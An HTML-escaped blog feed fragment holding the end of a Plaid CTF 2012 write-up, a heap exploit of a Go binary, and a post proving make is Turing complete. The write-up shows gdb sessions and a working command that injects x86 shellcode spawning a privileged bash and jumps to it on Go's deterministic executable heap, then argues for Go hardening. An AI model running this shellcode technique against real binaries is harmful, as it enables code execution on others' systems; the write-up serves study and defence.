&lt;span class="go"&gt;Starting program: /tmp/build/webapp --loglevel=2 --logfmt=&amp;quot;AAAAAAAAA%8d&amp;quot; --address=&amp;quot;:$(perl -e &amp;#39;print &amp;quot;A&amp;quot;x109, &amp;quot;BBBB&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;[Thread debugging using libthread_db enabled]&lt;/span&gt;
&lt;span class="go"&gt;[New Thread 0xb7ccbb70 (LWP 7869)]&lt;/span&gt;
&lt;span class="go"&gt;AAAAAAAAA       1Listening on :AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB&lt;/span&gt;

&lt;span class="go"&gt;Breakpoint 1, 0x08062537 in Log ()&lt;/span&gt;
&lt;span class="go"&gt;(gdb) x/a $esp&lt;/span&gt;
&lt;span class="go"&gt;0xbffff1ac: 0x42424242&lt;/span&gt;
&lt;span class="go"&gt;(gdb) find 0x18600000, 0x18900000, 0x42424242&lt;/span&gt;
&lt;span class="go"&gt;0x1883cd7b&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So now we know that our string, which is &lt;tt&gt;:AAAA...AAAABBBB&lt;/tt&gt;, is located at &lt;tt&gt;0x1883cd7b - 4 - 109 = 0x1883cd0e&lt;/tt&gt; on the heap. (Note - this is because string concatenations put strings onto the deterministic heap). But then we are done! We change string to include shell code, and then use our control flow control to jump to it.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./webapp -loglevel&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;100&lt;/span&gt; -logfmt&lt;span class="o"&gt;=&lt;/span&gt;AAAAAAAAA%8d -address&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;perl -e &lt;span class="s1"&gt;&amp;#39; print &amp;quot;:\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x0e\xcd\x83\x18&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;AAAAAAAAA       1Listening on :j&lt;/span&gt;
&lt;span class="go"&gt;                Xï¿½Rfh-pï¿½ï¿½Rjhh/bash/binï¿½ï¿½RQSï¿½ï¿½Í€AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÍƒ&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;p&gt;
Success!
&lt;/p&gt;
&lt;h3&gt;Postmortem&lt;/h3&gt;
&lt;p&gt;
This exploit is interesting for a number of reasons. First of all, it works on any (32 bit) machine running the same version of Go as the attacker. This is because heap allocations end up being quite deterministic. Next, this type of exploit (jump to an object on the executable heap, such as a string put there via a string concatenation) is something that would be easy to replicate in a variety of Go binaries. Lastly, the executable heap offers an easy surface for heap sprays and other attacks. It is also easy to imagine an expoit that uses a heap overwrite to clobber a closure and get code execution.
&lt;/p&gt;&lt;/p&gt;
&lt;p&gt;
It is also important to note that, while the vulnerability is introduced through C code, common C protections such as NX, ASLR, and libc randomization would make this binary very difficult to exploit without the use of the weak Go runtime. I wish to repeat: &lt;em&gt;this binary is easily exploitable because it is a Go binary&lt;/em&gt;, even assuming ASLR, NX, and libc randomization.
&lt;/p&gt;

&lt;p&gt;
I firmly believe that Go should consider randomizing its heap and making it no longer executable. I also think that it is imperative to provide a compiler option that hardens the binary by disabling the printing of debugging information (stack traces, faulting addresses) on program crashes and stripping debugging / package information from the binary. 
&lt;/p&gt;

&lt;h3&gt;Go Community Response&lt;/h3&gt;

&lt;p&gt;
For anyone who is interested, the Go community's response is &lt;a href="http://groups.google.com/group/golang-nuts/browse_thread/thread/25df6d94d73a8d41"&gt;here&lt;/a&gt;. In summary: vulnerabilities in Go are extremely unlikely so the engineering/complexity overhead required to implement any of these protections is not worth it. I respectfully disagree - vulnerabilities can come from cgo libraries or from as of yet unknown bugs in the Go runtime itself. Furthermore, I suspect that adding ASLR or NX would not require very much effort.
&lt;/p&gt;

&lt;h3&gt;Other writeups&lt;/h3&gt;

&lt;p&gt;
There are writeups of this problem available by:
&lt;ul&gt;
    &lt;li&gt;&lt;a href="http://eindbazen.net/2012/05/plaid-ctf-2012-bunyan/"&gt;Eindbazen&lt;/a&gt; (C style return to libc exploit)&lt;/li&gt;
    &lt;li&gt;&lt;a href="http://www.bases-hacking.org/bunyan-plaidctf2012.html"&gt;w3stormz&lt;/a&gt; (Go heap exploit, in French)&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;h3&gt;tl;dr&lt;/h3&gt;

&lt;p&gt;
Go binaries are compiled with a lot of debug info, which some people might want to strip. The Go heap is executable and deterministic, making the exploitation of the pCTF Bunyan problem relatively straightforward.
&lt;/p&gt;</content><category term="golang"></category><category term="exploitation"></category></entry><entry><title>CS Theory with Make</title><link href="https://codearcana.com/posts/2012/03/05/cs-theory-with-make.html" rel="alternate"></link><published>2012-03-05T00:00:00-08:00</published><updated>2012-03-05T00:00:00-08:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2012-03-05:/posts/2012/03/05/cs-theory-with-make.html</id><summary type="html">&lt;p&gt;In this post, I play around with some make functions and eventually provide a constructive proof that the make syntax is turing complete via reduction to μ-recursion.&lt;/p&gt;
&lt;p&gt;First, we have to construct numbers. I used the representation of numbers as
unary strings of the character &lt;code&gt;0&lt;/code&gt;: ie, the number 4 …&lt;/p&gt;</summary><content type="html">&lt;p&gt;In this post, I play around with some make functions and eventually provide a constructive proof that the make syntax is turing complete via reduction to μ-recursion.&lt;/p&gt;
&lt;p&gt;First, we have to construct numbers. I used the representation of numbers as
unary strings of the character &lt;code&gt;0&lt;/code&gt;: ie, the number 4 is represented by &lt;code&gt;0000&lt;/code&gt;
(zero being the empty string). We can also compute the successor of a number:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;# If this is called as a make function, $(1) will be replaced with the first&lt;/span&gt;
&lt;span class="c"&gt;# function argument.&lt;/span&gt;
&lt;span class="nv"&gt;successor&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; O&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nv"&gt;info&lt;/span&gt; &lt;span class="k"&gt;$&lt;/span&gt;(&lt;span class="nv"&gt;call&lt;/span&gt; &lt;span class="nv"&gt;successor&lt;/span&gt;,&lt;span class="nv"&gt;O&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="err"&gt;)&lt;/span&gt;  &lt;span class="c"&gt;# Outputs &amp;#39;OO&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Life is a lot easier if we can compute predecesser. Luckily, this is pretty
easy for us too:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;monus_one&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;patsubst O%,%,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;))&lt;/span&gt;

&lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nv"&gt;info&lt;/span&gt; &lt;span class="k"&gt;$&lt;/span&gt;(&lt;span class="nv"&gt;call&lt;/span&gt; &lt;span class="nv"&gt;monus_one&lt;/span&gt;,&lt;span class="nv"&gt;OO&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="err"&gt;)&lt;/span&gt;  &lt;span class="c"&gt;# Outputs &amp;#39;0&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now lets actually do computation with this. It is hideous, but we can actually
compute fibonacci numbers in make:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;fib&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;$(if&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;,&lt;span class="k"&gt;$(if&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;call monus_one,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;))&lt;/span&gt;,&lt;span class="k"&gt;$(&lt;/span&gt;call fib,&lt;span class="k"&gt;$(&lt;/span&gt;call &lt;span class="se"&gt;\&lt;/span&gt;
  monus_one,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;call fib,&lt;span class="k"&gt;$(&lt;/span&gt;call monus_one,&lt;span class="k"&gt;$(&lt;/span&gt;call monus_one,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;))))&lt;/span&gt;,O&lt;span class="o"&gt;)&lt;/span&gt;,O&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Let me try to break this up a bit. I'll add comments but it will no longer be
valid make.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;# fib (n):&lt;/span&gt;
&lt;span class="nv"&gt;fib&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;$(if&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;, &lt;span class="c1"&gt;# If n &amp;gt; 0:&lt;/span&gt;
          &lt;span class="k"&gt;$(if&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;call monus_one,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;))&lt;/span&gt;, &lt;span class="c1"&gt;# if n - 1 &amp;gt; 0:&lt;/span&gt;
&lt;span class="c"&gt;              # return fib(n-1) + fib(n-2)&lt;/span&gt;
              &lt;span class="k"&gt;$(&lt;/span&gt;call fib,&lt;span class="k"&gt;$(&lt;/span&gt;call monus_one,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)))$(&lt;/span&gt;call fib,&lt;span class="k"&gt;$(&lt;/span&gt;call monus_one,&lt;span class="k"&gt;$(&lt;/span&gt;call monus_one, &lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;))))&lt;/span&gt;
          ,O&lt;span class="k"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# else: return 1&lt;/span&gt;
      ,O&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# else: return 1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This is pretty fun and all, but we haven't actually done anything that we
couldn't do with a primitive recursive function. We can easily show that make
is more powerful than primitive recusion by encoding the &lt;a href="https://en.wikipedia.org/wiki/Ackermann_function"&gt;Ackerman
function&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;ack&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;$(if&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;,&lt;span class="k"&gt;$(if&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;2&lt;span class="k"&gt;)&lt;/span&gt;,&lt;span class="k"&gt;$(&lt;/span&gt;call ack,&lt;span class="k"&gt;$(&lt;/span&gt;call monus_one,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;))&lt;/span&gt;,&lt;span class="k"&gt;$(&lt;/span&gt;call &lt;span class="se"&gt;\&lt;/span&gt;
  ack,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;,&lt;span class="k"&gt;$(&lt;/span&gt;call monus_one,&lt;span class="k"&gt;$(&lt;/span&gt;2&lt;span class="k"&gt;))&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;,&lt;span class="k"&gt;$(&lt;/span&gt;call ack,&lt;span class="k"&gt;$(&lt;/span&gt;call monus_one,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;))&lt;/span&gt;,O&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;,&lt;span class="k"&gt;$(&lt;/span&gt;2&lt;span class="k"&gt;)&lt;/span&gt;O&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;All right, so how far can we take this? As it turns out, there is a class of
functions that are computable only by a turing complete language:
&lt;a href="https://en.wikipedia.org/wiki/%CE%9C-recursive_function"&gt;µ-recursive 
functions&lt;/a&gt;. They are
the primitive recursive functions with the addition of the minimization (µ)
operator: µ of f(x) is the minimum x such that f(x)=0. As it turns out, we can
encode this operator in make:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;# muh f x returns the first number greater than or equal to x such&lt;/span&gt;
&lt;span class="c"&gt;# that f(x) is true.&lt;/span&gt;
&lt;span class="nv"&gt;muh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;$(if&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;call &lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;,&lt;span class="k"&gt;$(&lt;/span&gt;2&lt;span class="k"&gt;))&lt;/span&gt;,&lt;span class="k"&gt;$(&lt;/span&gt;2&lt;span class="k"&gt;)&lt;/span&gt;,&lt;span class="k"&gt;$(&lt;/span&gt;call muh,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;,O&lt;span class="k"&gt;$(&lt;/span&gt;2&lt;span class="k"&gt;)))&lt;/span&gt;

&lt;span class="c"&gt;# mu f returns the first number greater than or equal to 0 such&lt;/span&gt;
&lt;span class="c"&gt;# that f(x) is true.&lt;/span&gt;
&lt;span class="nv"&gt;mu&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;call muh,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;,&lt;span class="k"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Wow! There we have it, make is turing complete. As a final piece of fun, here
is the inverse ackerman function:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;not&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;$(if&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;,,O&lt;span class="k"&gt;)&lt;/span&gt;

&lt;span class="c"&gt;# lesseq_template n creates a function lesseq_y that returns y &amp;lt; x&lt;/span&gt;
&lt;span class="cp"&gt;define lesseq_template&lt;/span&gt;
  lesseq_&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;findstring &lt;span class="nv"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;1&lt;span class="o"&gt;)&lt;/span&gt;,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="cp"&gt;endef&lt;/span&gt;

&lt;span class="c"&gt;# geack_template y creates a function geack_y that returns ack(x) &amp;gt; y&lt;/span&gt;
&lt;span class="cp"&gt;define geack_template&lt;/span&gt;
  geack_&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;eval&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;call lesseq_template,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)))&lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nv"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;call not,&lt;span class="nv"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;call lesseq_&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;,&lt;span class="nv"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;call ack,&lt;span class="nv"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;1&lt;span class="o"&gt;)&lt;/span&gt;,&lt;span class="nv"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;1&lt;span class="o"&gt;))))&lt;/span&gt;
&lt;span class="cp"&gt;endef&lt;/span&gt;

&lt;span class="c"&gt;# invack n: Find the first value x such that ack(x) &amp;gt; n.&lt;/span&gt;
&lt;span class="nv"&gt;invack&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;eval&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;call geack_template,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)))$(&lt;/span&gt;call mu,geack_&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</content><category term="make"></category><category term="theory"></category></entry></feed>